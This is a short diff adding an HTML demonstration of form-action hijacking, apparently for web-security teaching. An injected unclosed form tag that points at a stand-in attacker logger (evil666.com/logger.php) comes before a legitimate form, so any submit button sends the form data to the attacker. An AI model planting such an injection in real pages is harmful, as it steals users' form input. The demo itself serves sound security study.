@@ -1,0 +1,17 @@
+<!-- if we have a possibility for injection - we can override form action by injection a form tag before the legitimate form -->
+<html>
+
+<!-- injection goes here -->
+<form action="http://evil666.com/logger.php">
+<input type="submit"><br>
+end of injected code<br>
+<br>
+
+<form action="account.php">
+This is a legitimate form and a legitimate submit button<br>
+<input value="test" name="somevalue"><br>
+<input type="submit"><br>
+end of the legitimate form 
+</form><br>
+but the request will go to evil666.com when you click any of buttons
+</html>
